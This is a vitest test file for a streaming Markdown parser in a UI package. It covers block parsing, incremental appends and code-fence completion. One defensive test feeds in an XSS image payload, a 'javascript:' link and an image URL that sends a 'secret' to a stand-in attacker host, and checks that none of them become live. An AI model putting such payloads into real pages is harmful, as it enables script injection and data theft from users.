import { describe, expect, it } from "vitest";

import { MarkdownDocument, inlineText, parseMarkdown, type Inline, type MarkdownBlock } from "@fadenstack/ui";

/** A paragraph's or heading's inlines. */
const inlinesOf = (block: MarkdownBlock | undefined): Inline[] =>
  block && (block.kind === "paragraph" || block.kind === "heading") ? block.inlines : [];

describe("parseMarkdown", () => {
  it("reads GitHub Markdown into blocks", () => {
    const blocks = parseMarkdown([
      "# Title",
      "",
      "Some **bold** and `code`, a [link](https://example.com).",
      "",
      "- one",
      "- [x] done",
      "",
      "| a | b |",
      "|:--|--:|",
      "| 1 | 2 |",
      "",
      "> quoted",
      "",
      "```ts",
      "const x = 1;",
      "```",
      "",
      "---",
    ].join("\n"));
    expect(blocks.map((b) => b.kind)).toEqual(["heading", "paragraph", "list", "table", "quote", "code", "rule"]);
    expect(blocks[1]).toMatchObject({ inlines: [
      { kind: "text", text: "Some " }, { kind: "strong" }, { kind: "text", text: " and " }, { kind: "code", text: "code" },
      { kind: "text", text: ", a " }, { kind: "link", href: "https://example.com" }, { kind: "text", text: "." },
    ] });
    expect(blocks[2]).toMatchObject({ ordered: false, items: [{ checked: undefined }, { checked: true }] });
    expect(blocks[3]).toMatchObject({ align: ["left", "right"] });
    expect(blocks[5]).toMatchObject({ language: "ts", code: "const x = 1;", complete: true });
  });

  it("never makes HTML, unsafe links or images live", () => {
    const blocks = parseMarkdown('<img src=x onerror=alert(1)>\n\n[x](javascript:alert(1)) ![logo](https://evil.example/t.png?d=secret)');
    expect(blocks[0]).toMatchObject({ kind: "paragraph", inlines: [{ kind: "text", text: "<img src=x onerror=alert(1)>" }] });
    expect(blocks[1]).toMatchObject({ inlines: [{ kind: "text", text: "x " }, { kind: "image", alt: "logo" }] });
  });

  it("keeps characters marked escaped as they are", () => {
    expect(inlineText(inlinesOf(parseMarkdown("a < b & \"c\"")[0]))).toBe('a < b & "c"');
  });
});

describe("MarkdownDocument", () => {
  it("re-parses only the last block while streaming; earlier blocks keep their identity", () => {
    const doc = new MarkdownDocument();
    doc.append("First para");
    doc.append("graph.\n\nSecond");
    const first = doc.blocks[0];
    expect(doc.blocks.map((b) => b.kind)).toEqual(["paragraph", "paragraph"]);
    doc.append(" paragraph grows");
    expect(doc.blocks[0]).toBe(first);
    expect(inlineText(inlinesOf(doc.blocks[1]))).toBe("Second paragraph grows");
  });

  it("keeps the live block's key while it grows", () => {
    const doc = new MarkdownDocument("Intro.\n\nLi");
    const key = doc.blocks[1]!.key;
    doc.append("ve block");
    doc.append(" goes on");
    expect(doc.blocks[1]!.key).toBe(key);
  });

  it("shows an unclosed code block as incomplete until its fence arrives", () => {
    const doc = new MarkdownDocument("```python\nprint(1)\n");
    expect(doc.blocks[0]).toMatchObject({ kind: "code", complete: false, code: "print(1)" });
    doc.append("```\n");
    expect(doc.blocks[0]).toMatchObject({ kind: "code", complete: true });
  });

  it("turns a paragraph into a table once the divider arrives", () => {
    const doc = new MarkdownDocument("| a | b |\n");
    expect(doc.blocks[0]!.kind).toBe("paragraph");
    doc.append("|---|---|\n| 1 | 2 |\n");
    expect(doc.blocks[0]!.kind).toBe("table");
  });

  it("reports whether an update changed anything", () => {
    const doc = new MarkdownDocument("Hello");
    expect(doc.append("\n")).toBe(false);
    expect(doc.append("World")).toBe(true);
  });

  it("ends up with the same blocks as parsing the whole text at once", () => {
    const text = "# T\n\nA *b* c.\n\n1. x\n2. y\n\n```js\nlet a;\n```\n\nEnd.";
    const doc = new MarkdownDocument();
    for (const ch of text) doc.append(ch);
    const strip = (blocks: readonly unknown[]) => JSON.parse(JSON.stringify(blocks, (k, v) => (k === "key" ? undefined : v)));
    expect(strip(doc.blocks)).toEqual(strip(parseMarkdown(text)));
  });
});
